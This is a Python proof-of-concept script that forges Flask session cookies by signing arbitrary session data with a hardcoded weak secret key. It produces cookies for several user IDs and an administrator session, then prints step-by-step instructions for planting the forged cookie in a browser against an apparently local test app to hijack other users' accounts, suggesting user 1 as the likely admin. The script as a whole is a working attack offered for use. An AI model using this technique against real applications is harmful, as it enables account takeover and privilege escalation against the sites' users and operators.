from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'trump123'  # The weak secret key - this is the vulnerability!

print("=== FORGING MALICIOUS SESSION COOKIES ===")
print("Using weak secret key: 'trump123'")
print()

# Generate the session interface
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)

# 1. Forge session for user 999 (non-existent user)
print("1. FORGING SESSION FOR USER 999:")
malicious_session_1 = {'user_id': 999}
forged_cookie_1 = serializer.dumps(malicious_session_1)
print(f"   Session data: {malicious_session_1}")
print(f"   Forged cookie: {forged_cookie_1}")
print()

# 2. Forge session for user 1 (likely admin/first user)
print("2. FORGING SESSION FOR USER 1 (POTENTIAL ADMIN):")
malicious_session_2 = {'user_id': 1}
forged_cookie_2 = serializer.dumps(malicious_session_2)
print(f"   Session data: {malicious_session_2}")
print(f"   Forged cookie: {forged_cookie_2}")
print()

# 3. Forge session with additional privileges
print("3. FORGING ADMIN SESSION WITH EXTRA PRIVILEGES:")
admin_session = {'user_id': 1, 'is_admin': True, 'role': 'administrator'}
admin_cookie = serializer.dumps(admin_session)
print(f"   Session data: {admin_session}")
print(f"   Forged cookie: {admin_cookie}")
print()

# 4. Forge session for user 50 (middle range)
print("4. FORGING SESSION FOR USER 50:")
user_50_session = {'user_id': 50}
user_50_cookie = serializer.dumps(user_50_session)
print(f"   Session data: {user_50_session}")
print(f"   Forged cookie: {user_50_cookie}")
print()

print("🚨 ATTACK INSTRUCTIONS:")
print("1. Copy any of the forged cookies above")
print("2. Open browser Developer Tools (F12)")
print("3. Go to Application → Cookies → http://127.0.0.1:5001")
print("4. Find the 'session' cookie and replace its value")
print("5. Navigate to /profile/[user_id] to access that user's data")
print("6. You've successfully hijacked their session!")
print()
print("💡 TIP: Try the user 1 cookie first - it's likely the admin account")
